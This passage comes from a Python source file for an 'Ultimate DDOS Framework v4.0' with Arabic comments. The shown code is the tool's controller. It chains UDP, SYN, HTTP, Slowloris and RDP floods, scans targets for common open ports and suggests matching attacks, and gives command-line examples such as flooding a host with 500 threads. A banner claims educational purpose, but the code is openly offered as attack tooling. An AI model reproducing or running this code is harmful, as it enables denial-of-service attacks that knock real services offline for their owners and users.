            choice = choice.strip()
            if choice == '1':
                attacks.append(('UDP', self.attacks.udp_advanced))
            elif choice == '2':
                attacks.append(('SYN', self.attacks.tcp_syn_advanced))
            elif choice == '3':
                attacks.append(('HTTP', self.attacks.http_advanced))
            elif choice == '4':
                attacks.append(('Slowloris', self.attacks.slowloris_attack))
            elif choice == '5':
                attacks.append(('RDP', self.rdp.rdp_multi_vector))
        
        if not attacks:
            print(f"{Colors.RED}[-] No attacks selected{Colors.END}")
            return 0
        
        # تقسيم المدة على الهجمات
        attack_duration = duration / len(attacks)
        total = 0
        
        for i, (name, attack_func) in enumerate(attacks, 1):
            print(f"\n{Colors.BLUE}[+] Running {name} attack ({i}/{len(attacks)}){Colors.END}")
            
            try:
                result = attack_func(ip, port, attack_duration)
                total += result
                print(f"{Colors.GREEN}[+] {name}: {result:,}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}[-] {name} failed: {e}{Colors.END}")
        
        return total
    
    def show_config(self):
        """عرض وتعديل الإعدادات"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ CONFIGURATION ══════════{Colors.END}")
        
        for key, value in self.config.items():
            print(f"{Colors.YELLOW}{key}:{Colors.END} {value}")
        
        change = input(f"\n{Colors.YELLOW}Change settings? (y/n): {Colors.END}").lower()
        
        if change == 'y':
            print(f"\n{Colors.YELLOW}Enter new values (press Enter to keep current):{Colors.END}")
            
            for key in self.config.keys():
                new_value = input(f"{key} [{self.config[key]}]: ").strip()
                if new_value:
                    # تحويل النوع المناسب
                    if isinstance(self.config[key], int):
                        self.config[key] = int(new_value)
                    elif isinstance(self.config[key], bool):
                        self.config[key] = new_value.lower() in ['true', 'yes', 'y', '1']
                    else:
                        self.config[key] = new_value
            
            if ConfigManager.save_config(self.config):
                print(f"{Colors.GREEN}[+] Configuration saved{Colors.END}")
            else:
                print(f"{Colors.RED}[-] Failed to save configuration{Colors.END}")
    
    def target_scanner(self):
        """ماسح الأهداف"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ TARGET SCANNER ══════════{Colors.END}")
        
        target = input(f"{Colors.YELLOW}Target IP/Hostname: {Colors.END}").strip()
        
        if not SecurityValidator.validate_ip(target):
            print(f"{Colors.RED}[-] Invalid target{Colors.END}")
            return
        
        print(f"\n{Colors.YELLOW}[*] Scanning {target}...{Colors.END}")
        
        # فحص المنافذ الشائعة
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    open_ports.append(port)
                    print(f"{Colors.GREEN}[+] Port {port} is OPEN{Colors.END}")
                else:
                    print(f"{Colors.RED}[-] Port {port} is CLOSED{Colors.END}")
                
                sock.close()
            except:
                print(f"{Colors.YELLOW}[*] Port {port} check failed{Colors.END}")
            
            time.sleep(0.1)  # لتجنب القيود
        
        if open_ports:
            print(f"\n{Colors.GREEN}[+] Open ports found: {', '.join(map(str, open_ports))}{Colors.END}")
            
            # اقتراح هجمات بناء على المنافذ المفتوحة
            print(f"\n{Colors.YELLOW}[*] Suggested attacks:{Colors.END}")
            
            if 3389 in open_ports:
                print("  - RDP Attacks (1-4)")
            if 80 in open_ports or 443 in open_ports or 8080 in open_ports:
                print("  - HTTP Flood (7)")
                print("  - Slowloris (8)")
            if 53 in open_ports:
                print("  - DNS Amplification (9)")
            print("  - UDP/SYN Flood (5-6)")
            print("  - Smart Attack (10)")
        else:
            print(f"\n{Colors.RED}[-] No open ports found{Colors.END}")
    
    def quick_test(self):
        """وضع الاختبار السريع"""
        print(f"\n{Colors.BOLD}{Colors.YELLOW}══════════ QUICK TEST MODE ══════════{Colors.END}")
        print(f"{Colors.YELLOW}[*] This will test the framework locally{Colors.END}")
        
        confirm = input(f"{Colors.YELLOW}Continue? (y/n): {Colors.END}").lower()
        if confirm != 'y':
            return
        
        print(f"\n{Colors.GREEN}[1] Starting test server...{Colors.END}")
        
        # تشغيل خادم اختباري بسيط
        import subprocess
        import atexit
        
        # خادم Python بسيط
        server_code = """
import socket
import threading

def handle_client(client_socket):
    try:
        request = client_socket.recv(1024)
        response = b"HTTP/1.1 200 OK\\r\\n\\r\\nTest Server"
        client_socket.send(response)
    except:
        pass
    finally:
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', 9999))
    server.listen(5)
    
    print("[Test Server] Listening on 127.0.0.1:9999")
    
    while True:
        client, addr = server.accept()
        handler = threading.Thread(target=handle_client, args=(client,))
        handler.start()

if __name__ == "__main__":
    start_server()
"""
        
        # حفظ وتشغيل الخادم
        with open('test_server.py', 'w') as f:
            f.write(server_code)
        
        server_process = subprocess.Popen([sys.executable, 'test_server.py'],
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
        
        # تأكد من إيقاف الخادم عند الخروج
        def cleanup():
            server_process.terminate()
            if os.path.exists('test_server.py'):
                os.remove('test_server.py')
        
        atexit.register(cleanup)
        
        time.sleep(2)  # انتظر حتى يبدأ الخادم
        
        print(f"{Colors.GREEN}[2] Testing UDP Flood...{Colors.END}")
        result = self.attacks.udp_advanced("127.0.0.1", 9999, 3)
        print(f"{Colors.GREEN}[+] UDP Test: {result} packets{Colors.END}")
        
        time.sleep(1)
        
        print(f"{Colors.GREEN}[3] Testing HTTP Flood...{Colors.END}")
        result = self.attacks.http_advanced("127.0.0.1", 9999, 3)
        print(f"{Colors.GREEN}[+] HTTP Test: {result} requests{Colors.END}")
        
        print(f"\n{Colors.GREEN}[+] Quick test completed successfully!{Colors.END}")
        print(f"{Colors.YELLOW}[*] Cleaning up...{Colors.END}")
        
        cleanup()
        atexit.unregister(cleanup)
    
    def run(self):
        """تشغيل الواجهة الرئيسية"""
        self.show_banner()
        
        print(f"{Colors.YELLOW}[*] Welcome to Ultimate DDOS Framework v4.0{Colors.END}")
        print(f"{Colors.YELLOW}[*] Type 'help' for commands or select from menu{Colors.END}")
        
        while True:
            try:
                choice = self.show_menu()
                
                if choice == '0':
                    print(f"\n{Colors.GREEN}[+] Exiting...{Colors.END}")
                    self.logger.show_stats()
                    break
                
                elif choice == 'help':
                    print(f"\n{Colors.CYAN}[HELP] Available commands:{Colors.END}")
                    print("  menu - Show main menu")
                    print("  stats - Show attack statistics")
                    print("  config - Show configuration")
                    print("  scan - Scan target")
                    print("  test - Quick test")
                    print("  clear - Clear screen")
                    print("  exit - Exit program")
                
                elif choice == 'stats':
                    self.logger.show_stats()
                
                elif choice == 'config':
                    self.show_config()
                
                elif choice == 'scan':
                    self.target_scanner()
                
                elif choice == 'test':
                    self.quick_test()
                
                elif choice == 'clear':
                    os.system('clear')
                    self.show_banner()
                
                elif choice.isdigit() and 1 <= int(choice) <= 16:
                    if int(choice) <= 12:
                        ip, port, duration, threads = self.get_target()
                        
                        confirm = input(f"\n{Colors.RED}Start attack? (y/n): {Colors.END}").lower()
                        if confirm == 'y':
                            self.run_attack(int(choice), ip, port, duration, threads)
                    elif int(choice) == 13:
                        self.logger.show_stats()
                    elif int(choice) == 14:
                        self.show_config()
                    elif int(choice) == 15:
                        self.target_scanner()
                    elif int(choice) == 16:
                        self.quick_test()
                
                else:
                    print(f"{Colors.RED}[-] Invalid choice{Colors.END}")
                
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted{Colors.END}")
                confirm = input(f"{Colors.YELLOW}Exit? (y/n): {Colors.END}").lower()
                if confirm == 'y':
                    break
            
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

# ==================== COMMAND LINE INTERFACE ====================
def cmd_interface():
    """واجهة سطر الأوامر المتقدمة"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Ultimate DDOS Framework v4.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 ddos.py 192.168.1.1 -m smart
  python3 ddos.py 192.168.1.1 -p 80 -m http -t 500 -d 60
  python3 ddos.py example.com -m mixed -d 120
        '''
    )
    
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-m', '--method', 
                       choices=['udp', 'syn', 'http', 'rdp', 'slowloris', 'dns', 'smart', 'mixed', 'all'],
                       default='smart', help='Attack method')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds')
    parser.add_argument('-s', '--service', help='Service type (auto-detect port)')
    parser.add_argument('--scan', action='store_true', help='Scan target first')
    parser.add_argument('--test', action='store_true', help='Run in test mode')
    
    args = parser.parse_args()
    
    ultimate = UltimateDDOSController()
    
    # وضع الاختبار
    if args.test:
        ultimate.quick_test()
        return
    
    # التحقق من الهدف
    if not SecurityValidator.validate_ip(args.target):
        print(f"{Colors.RED}[-] Invalid target: {args.target}{Colors.END}")
        return
    
    # المسح أولاً إذا مطلوب
    if args.scan:
        print(f"{Colors.BLUE}[*] Scanning target...{Colors.END}")
        # هذا مثال مبسط، يمكنك إضافة مسح حقيقي هنا
    
    # تحديد المنفذ
    if not args.port and args.service:
        if args.service in SERVICE_PORTS:
            args.port = SERVICE_PORTS[args.service][0]
            print(f"{Colors.GREEN}[+] Using port {args.port} for {args.service}{Colors.END}")
    
    args.port = args.port or 80
    
    # تعيين طريقة الهجوم
    method_map = {
        'udp': 5,
        'syn': 6,
        'http': 7,
        'rdp': 4,
        'slowloris': 8,
        'dns': 9,
        'smart': 10,
        'mixed': 11,
        'all': 11
    }
    
    ultimate.show_banner()
    ultimate.run_attack(method_map[args.method], args.target, args.port, args.duration, args.threads)

# ==================== MAIN ====================
if __name__ == "__main__":
    # عرض تحذير
    print(f"{Colors.RED}{Colors.BOLD}")
    print("╔═══════════════════════════════════════════════════════╗")
    print("║                     WARNING!                          ║")
    print("║   This tool is for EDUCATIONAL PURPOSES ONLY.        ║")
    print("║   Unauthorized use against systems you don't own     ║")
    print("║   or have permission to test is ILLEGAL.             ║")
    print("║                                                       ║")
    print("║   By using this tool, you agree that:                ║")
    print("║   1. You will only test your own systems             ║")
    print("║   2. You have proper authorization                   ║")
    print("║   3. You accept all responsibility for your actions  ║")
    print("╚═══════════════════════════════════════════════════════╝")
    print(Colors.END)
    
    confirm = input(f"{Colors.YELLOW}Do you accept these terms? (yes/no): {Colors.END}").lower()
    
    if confirm != 'yes':
        print(f"{Colors.RED}[*] Exiting...{Colors.END}")
        sys.exit(0)
    
    # التحقق من صلاحيات النظام
    if os.name == 'posix' and os.geteuid() != 0:
        print(f"{Colors.YELLOW}[!] Some features may require root privileges{Colors.END}")
        print(f"{Colors.YELLOW}[!] Running with limited capabilities{Colors.END}")
    
    # تشغيل الوضع المناسب
    if len(sys.argv) > 1:
        cmd_interface()
    else:
        ultimate = UltimateDDOSController()
        ultimate.run()
